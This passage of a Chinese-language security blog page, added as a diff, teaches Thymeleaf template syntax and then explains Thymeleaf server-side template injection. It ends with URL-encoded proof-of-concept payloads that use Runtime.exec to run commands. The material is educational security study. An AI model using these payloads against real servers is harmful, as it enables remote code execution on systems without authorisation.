+<td></td>
+</tr>
+<tr>
+<td>th:each</td>
+<td>迭代</td>
+<td><tr th:each="student:${user}" ></td>
+<td></td>
+</tr>
+<tr>
+<td>th:href</td>
+<td>替换超链接</td>
+<td><a th:href="@{index.html}">超链接</a></td>
+<td></td>
+</tr>
+<tr>
+<td>th:src</td>
+<td>替换资源</td>
+<td><script type="text/javascript" th:src="@{index.js}"></script></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<h4 id="链接表达式"><a href="#链接表达式" class="headerlink" title="链接表达式"></a>链接表达式</h4><p><font style="color:rgb(51, 51, 51);">在Thymeleaf<br></font>中，如果想引入链接比如link，href，src，需要使用@{资源地址}引入资源。引入的地址可以在static目录下，也可以司互联网中的资源。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=<span class="string">&quot;stylesheet&quot;</span> th:href=<span class="string">&quot;@&#123;index.css&#125;&quot;</span>&gt;</span><br><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span> th:src=<span class="string">&quot;@&#123;index.js&#125;&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;a th:href=<span class="string">&quot;@&#123;index.html&#125;&quot;</span>&gt;超链接&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="变量表达式"><a href="#变量表达式" class="headerlink" title="变量表达式"></a>变量表达式</h4><p>可以通过${…}在model中取值，如果在Model中存储字符串，则可以通过${对象名}直接取值。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">getindex</span><span class="params">(Model model)</span><span class="comment">//对应函数</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//数据添加到model中</span></span><br><span class="line">model.addAttribute(<span class="string">&quot;name&quot;</span>,<span class="string">&quot;bigsai&quot;</span>);<span class="comment">//普通字符串</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;index&quot;</span>;<span class="comment">//与templates中index.html对应</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;td th:text=<span class="string">&quot;&#x27;我的名字是：&#x27;+$&#123;name&#125;&quot;</span>&gt;&lt;/td&gt;</span><br></pre></td></tr></table></figure>
+
+<p>取JavaBean对象使用${对象名.对象属性}或者${对象名[‘对象属性’]}来取值。如果JavaBean写了get方法也可以通过${对象.get方法名}取值。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">getindex</span><span class="params">(Model model)</span><span class="comment">//对应函数</span></span><br><span class="line">&#123;</span><br><span class="line">user user1=<span class="keyword">new</span> <span class="title class_">user</span>(<span class="string">&quot;bigsai&quot;</span>,<span class="number">22</span>,<span class="string">&quot;一个幽默且热爱java的社会青年&quot;</span>);</span><br><span class="line">model.addAttribute(<span class="string">&quot;user&quot;</span>,user1);<span class="comment">//储存javabean</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;index&quot;</span>;<span class="comment">//与templates中index.html对应</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;td th:text=<span class="string">&quot;$&#123;user.name&#125;&quot;</span>&gt;&lt;/td&gt;</span><br><span class="line">&lt;td th:text=<span class="string">&quot;$&#123;user[&#x27;age&#x27;]&#125;&quot;</span>&gt;&lt;/td&gt;</span><br><span class="line">&lt;td th:text=<span class="string">&quot;$&#123;user.getDetail()&#125;&quot;</span>&gt;&lt;/td&gt;</span><br></pre></td></tr></table></figure>
+
+<p>取Map对象使用${Map名[‘key’]}或${Map名.key}。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;index&quot;)</span><span class="comment">//页面的url地址</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getindex</span><span class="params">(Model model)</span><span class="comment">//对应函数</span></span><br><span class="line">&#123;</span><br><span class="line">Map&lt;String ,String&gt;map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">map.put(<span class="string">&quot;place&quot;</span>,<span class="string">&quot;博学谷&quot;</span>);</span><br><span class="line">map.put(<span class="string">&quot;feeling&quot;</span>,<span class="string">&quot;very well&quot;</span>);</span><br><span class="line"><span class="comment">//数据添加到model中</span></span><br><span class="line">model.addAttribute(<span class="string">&quot;map&quot;</span>,map);<span class="comment">//储存Map</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;index&quot;</span>;<span class="comment">//与templates中index.html对应</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;td th:text=<span class="string">&quot;$&#123;map.get(&#x27;place&#x27;)&#125;&quot;</span>&gt;&lt;/td&gt;</span><br><span class="line">&lt;td th:text=<span class="string">&quot;$&#123;map[&#x27;feeling&#x27;]&#125;&quot;</span>&gt;&lt;/td&gt;</span><br></pre></td></tr></table></figure>
+
+<p>取List集合：List集合是一个有序列表，需要使用each遍历赋值，<tr th:each="item:${userlist}"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;index&quot;)</span><span class="comment">//页面的url地址</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getindex</span><span class="params">(Model model)</span><span class="comment">//对应函数</span></span><br><span class="line">&#123;</span><br><span class="line">List&lt;String&gt;userList=<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">userList.add(<span class="string">&quot;zhang san 66&quot;</span>);</span><br><span class="line">userList.add(<span class="string">&quot;li si 66&quot;</span>);</span><br><span class="line">userList.add(<span class="string">&quot;wang wu 66&quot;</span>);</span><br><span class="line"><span class="comment">//数据添加到model中</span></span><br><span class="line">model.addAttribute(<span class="string">&quot;userlist&quot;</span>,userList);<span class="comment">//储存List</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;index&quot;</span>;<span class="comment">//与templates中index.html对应</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;tr th:each=<span class="string">&quot;item:$&#123;userlist&#125;&quot;</span>&gt;</span><br><span class="line">&lt;td th:text=<span class="string">&quot;$&#123;item&#125;&quot;</span>&gt;&lt;/td&gt;</span><br><span class="line">&lt;/tr&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="选择变量表达式"><a href="#选择变量表达式" class="headerlink" title="选择变量表达式"></a>选择变量表达式</h4><p>变量表达式也可以写为*{…}。星号语法对选定对象而不是整个上下文评估表达式。也就是说，只要没有选定的对象，美元(${…})和星号(*{…})的语法就完全一样。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;div th:object=<span class="string">&quot;$&#123;user&#125;&quot;</span>&gt;</span><br><span class="line">&lt;p&gt;Name: &lt;span th:text=<span class="string">&quot;*&#123;name&#125;&quot;</span>&gt;赛&lt;/span&gt;.&lt;/p&gt;</span><br><span class="line">&lt;p&gt;Age: &lt;span th:text=<span class="string">&quot;*&#123;age&#125;&quot;</span>&gt;<span class="number">18</span>&lt;/span&gt;.&lt;/p&gt;</span><br><span class="line">&lt;p&gt;Detail: &lt;span th:text=<span class="string">&quot;*&#123;detail&#125;&quot;</span>&gt;好好学习&lt;/span&gt;.&lt;/p&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="消息表达式"><a href="#消息表达式" class="headerlink" title="消息表达式"></a>消息表达式</h4><p>文本外部化是从模板文件中提取模板代码的片段，以便可以将它们保存在单独的文件(通常是.properties文件)中,文本的外部化片段通常称为“消息”。通俗易懂的来说#{…}<font style="color:rgb(51, 51, 51);">语法就是用来<br></font><strong>读取配置文件中数据</strong> 的。</p>
+<h4 id="片段表达式"><a href="#片段表达式" class="headerlink" title="片段表达式"></a>片段表达式</h4><p>片段表达式~{…}可以用于引用公共的目标片段，比如可以在一个template&#x2F;footer.html中定义下面的片段,并在另一个template中引用。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;div th:fragment=<span class="string">&quot;copy&quot;</span>&gt;</span><br><span class="line">© <span class="number">2011</span> The Good Thymes Virtual Grocery</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;div th:insert=<span class="string">&quot;~&#123;footer :: copy&#125;&quot;</span>&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Thymeleaf-模板注入漏洞"><a href="#Thymeleaf-模板注入漏洞" class="headerlink" title="Thymeleaf 模板注入漏洞"></a>Thymeleaf 模板注入漏洞</h3><p>Thymeleaf SSTI 漏洞通常发生在使用动态输入来生成 Thymeleaf 模板的情况下。攻击者可以通过精心 构造的输入向服务器发送恶意代码，这些代码将被 Thymeleaf 视为有效的模板表达式，并在服务器上执 行。因此会导致服务器上的远程代码执行，从而使攻击者能够完全接管服务器并访问敏感数据。在 Thymeleaf 中，可以使用表达式来动态设置模板的值。例如， ${user.name} 将被替换为用户的名 称。攻击者可以使用类似${T(java.lang.Runtime).getRuntime().exec(‘calc’)} 的表达式来执行 任意的系统命令。Thymeleaf 3.0.0 至 3.0.11 版本存在模板注入漏洞。该漏洞在Thymeleaf 3.0.12及以后版本已经得到修 复，但还是存在一些 Bypass 的方式。</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://tttang.com/archive/1412/#toc_0x03-thymeleaf">https://tttang.com/archive/1412/#toc_0x03-thymeleaf</a></p>
+<p><a target="_blank" rel="noopener" href="https://forum.butian.net/share/1661">https://forum.butian.net/share/1661</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.ctfiot.com/110645.html">https://www.ctfiot.com/110645.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9826">https://xz.aliyun.com/t/9826</a></p>
+<p>Thymeleaf模版注入漏洞分两种场景，按照经Servlet处理后得到的viewTemplateName包含”<strong>::</strong>“和不包含”<strong>::</strong>“两种情况。</p>
+<p>poc：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">选择模板语法</span><br><span class="line">__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(<span class="string">&quot;open%20-a%20calculator&quot;</span>).getInputStream()).next()%7d__::.x</span><br><span class="line"></span><br><span class="line">片段选择器</span><br><span class="line">__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(<span class="string">&quot;touch /tmp/test.txt&quot;</span>).getInputStream()).next()%7d__::.x</span><br><span class="line"></span><br><span class="line">拼接路径</span><br><span class="line">__%<span class="number">24</span>%7Bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22open -a20calculator%<span class="number">22</span>).getInputStream()).next()%7D__%3A%3A.x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/categories/">Category</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/link/">Friends</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Velocity%E7%9A%84%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">Velocity的简介</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95"><span class="toc-number">1.1.</span> <span class="toc-text">1 基本语法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%85%B3%E9%94%AE%E5%AD%97"><span class="toc-number">1.1.1.</span> <span class="toc-text">1 关键字</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%8F%98%E9%87%8F"><span class="toc-number">1.1.2.</span> <span class="toc-text">2 变量</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E8%BD%AC%E4%B9%89%E5%AD%97%E7%AC%A6%E5%92%8C%E9%80%BB%E8%BE%91%E6%93%8D%E4%BD%9C%E7%AC%A6"><span class="toc-number">1.1.3.</span> <span class="toc-text">3 转义字符和逻辑操作符</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E5%BE%AA%E7%8E%AF"><span class="toc-number">1.1.4.</span> <span class="toc-text">4 循环</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.1.5.</span> <span class="toc-text">5 条件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-%E6%B3%A8%E9%87%8A"><span class="toc-number">1.1.6.</span> <span class="toc-text">6 注释</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-%E5%BC%95%E5%85%A5%E8%B5%84%E6%BA%90"><span class="toc-number">1.1.7.</span> <span class="toc-text">7 引入资源</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81POC"><span class="toc-number">1.2.</span> <span class="toc-text">常见POC</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#evaluate%E4%BE%8B%E5%AD%90%EF%BC%9A"><span class="toc-number">1.2.1.</span> <span class="toc-text">evaluate例子：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#merage"><span class="toc-number">1.2.2.</span> <span class="toc-text">merage:</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FreeMarker%E7%AE%80%E4%BB%8B"><span class="toc-number">2.</span> <span class="toc-text">FreeMarker简介</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#FreeMarker%E8%AF%AD%E6%B3%95"><span class="toc-number">2.1.</span> <span class="toc-text">FreeMarker语法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FreeMarker%E5%B8%B8%E7%94%A8%E8%AF%AD%E6%B3%95"><span class="toc-number">2.2.</span> <span class="toc-text">FreeMarker常用语法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#if%E6%8C%87%E4%BB%A4"><span class="toc-number">2.2.1.</span> <span class="toc-text">if指令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#list%E6%8C%87%E4%BB%A4"><span class="toc-number">2.2.2.</span> <span class="toc-text">list指令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%81%8D%E5%8E%86Map"><span class="toc-number">2.2.3.</span> <span class="toc-text">遍历Map</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A9%BA%E5%80%BC%E5%A4%84%E7%90%86"><span class="toc-number">2.2.4.</span> <span class="toc-text">空值处理</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FreeMarker%E6%B3%A8%E5%85%A5"><span class="toc-number">2.3.</span> <span class="toc-text">FreeMarker注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%85%E7%BD%AE%E5%87%BD%E6%95%B0"><span class="toc-number">2.3.1.</span> <span class="toc-text">内置函数</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#new"><span class="toc-number">2.3.1.1.</span> <span class="toc-text">new</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#API"><span class="toc-number">2.3.1.2.</span> <span class="toc-text">API</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%80%E4%BA%9Bpoc1"><span class="toc-number">2.3.1.3.</span> <span class="toc-text">一些poc1</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BB%95%E8%BF%87class-getClassloader%E5%8F%8D%E5%B0%84%E5%8A%A0%E8%BD%BDExecute%E7%B1%BB"><span class="toc-number">2.3.1.4.</span> <span class="toc-text">绕过class.getClassloader反射加载Execute类</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Thymeleaf"><span class="toc-number">3.</span> <span class="toc-text">Thymeleaf</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%AD%E6%B3%95"><span class="toc-number">3.1.</span> <span class="toc-text">语法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%87%E7%AD%BE"><span class="toc-number">3.1.1.</span> <span class="toc-text">标签</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%93%BE%E6%8E%A5%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-number">3.1.2.</span> <span class="toc-text">链接表达式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%98%E9%87%8F%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-number">3.1.3.</span> <span class="toc-text">变量表达式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%89%E6%8B%A9%E5%8F%98%E9%87%8F%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-number">3.1.4.</span> <span class="toc-text">选择变量表达式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B6%88%E6%81%AF%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-number">3.1.5.</span> <span class="toc-text">消息表达式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%89%87%E6%AE%B5%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-number">3.1.6.</span> <span class="toc-text">片段表达式</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Thymeleaf-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.2.</span> <span class="toc-text">Thymeleaf 模板注入漏洞</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://oceanzbz.github.io/2024/12/30/Java%E5%AE%89%E5%85%A8/Java%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://oceanzbz.github.io/2024/12/30/Java%E5%AE%89%E5%85%A8/Java%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/&text=Java模版注入"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://oceanzbz.github.io/2024/12/30/Java%E5%AE%89%E5%85%A8/Java%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/&title=Java模版注入"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://oceanzbz.github.io/2024/12/30/Java%E5%AE%89%E5%85%A8/Java%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/&is_video=false&description=Java模版注入"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Java模版注入&body=Check out this article: https://oceanzbz.github.io/2024/12/30/Java%E5%AE%89%E5%85%A8/Java%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://oceanzbz.github.io/2024/12/30/Java%E5%AE%89%E5%85%A8/Java%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/&title=Java模版注入"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://oceanzbz.github.io/2024/12/30/Java%E5%AE%89%E5%85%A8/Java%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/&title=Java模版注入"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://oceanzbz.github.io/2024/12/30/Java%E5%AE%89%E5%85%A8/Java%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/&title=Java模版注入"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://oceanzbz.github.io/2024/12/30/Java%E5%AE%89%E5%85%A8/Java%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/&title=Java模版注入"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://oceanzbz.github.io/2024/12/30/Java%E5%AE%89%E5%85%A8/Java%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/&name=Java模版注入&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://oceanzbz.github.io/2024/12/30/Java%E5%AE%89%E5%85%A8/Java%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/&t=Java模版注入"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    Oceanzbz
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/link/">Friends</a></li><!--
+     -->
+      </ul>
+      <ul>
+        
+          <!-- 不蒜子统计 -->
+          <span id="busuanzi_container_site_pv">
+              本站总访问量<span id="busuanzi_value_site_pv"></span>次
+          </span>
+          <span class="post-meta-divider">|</span>
+          <span id="busuanzi_container_site_uv" style='display:none'>
+                  本站访客数<span id="busuanzi_value_site_uv"></span>人
+          </span>
+          <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        
+      </ul>
+    </nav>
+  </div>
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-QWTJSPQL4F"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-QWTJSPQL4F');
+</script>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'cactus-1';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+</body>
+</html>
